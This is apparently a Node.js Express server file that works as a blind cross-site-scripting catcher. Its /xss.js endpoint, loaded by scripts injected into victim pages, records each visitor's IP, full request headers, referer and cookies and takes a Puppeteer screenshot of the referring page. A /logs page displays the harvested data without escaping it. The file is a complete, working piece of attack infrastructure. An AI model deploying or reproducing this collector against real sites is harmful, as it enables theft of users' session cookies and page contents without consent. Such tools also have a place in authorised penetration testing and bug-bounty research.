// server.js
const express = require("express");
const puppeteer = require("puppeteer");
const app = express();
const port = process.env.PORT || 3000;

let logs = [];

app.get("/xss.js", async (req, res) => {
  const timestamp = new Date().toISOString();
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const headers = req.headers;
  const referer = headers.referer || "N/A";
  const cookies = headers.cookie || "N/A";

  // Take screenshot of the referer URL using puppeteer
  let screenshotBase64 = "";
  if (referer !== "N/A" && referer.startsWith("http")) {
    try {
      const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
      const page = await browser.newPage();
      await page.goto(referer, { waitUntil: "networkidle2", timeout: 10000 });
      screenshotBase64 = await page.screenshot({ encoding: "base64", fullPage: false });
      await browser.close();
    } catch (err) {
      screenshotBase64 = "Error taking screenshot";
    }
  }

  // Log data
  logs.push({
    timestamp,
    ip,
    headers,
    referer,
    cookies,
    screenshot: screenshotBase64,
  });

  // Simple payload: alerts and sends back some info
  res.set("Content-Type", "application/javascript");
  res.send(`console.log("Blind XSS Triggered at ${timestamp}");`);
});

app.get("/logs", (req, res) => {
  let html = "<h1>Blind XSS Logs</h1>";
  logs.forEach((log, i) => {
    html += `<h3>Trigger #${i + 1} at ${log.timestamp}</h3>`;
    html += `<p><b>IP:</b> ${log.ip}</p>`;
    html += `<p><b>Referer:</b> ${log.referer}</p>`;
    html += `<p><b>Cookies:</b> ${log.cookies}</p>`;
    html += `<p><b>Headers:</b><pre>${JSON.stringify(log.headers, null, 2)}</pre></p>`;
    if (log.screenshot && !log.screenshot.startsWith("Error")) {
      html += `<p><b>Screenshot:</b><br><img src="data:image/png;base64,${log.screenshot}" width="400"/></p>`;
    } else {
      html += `<p><b>Screenshot:</b> ${log.screenshot}</p>`;
    }
    html += "<hr/>";
  });
  res.send(html);
});

app.listen(port, () => {
  console.log(`Blind XSS catcher running on port ${port}`);
});
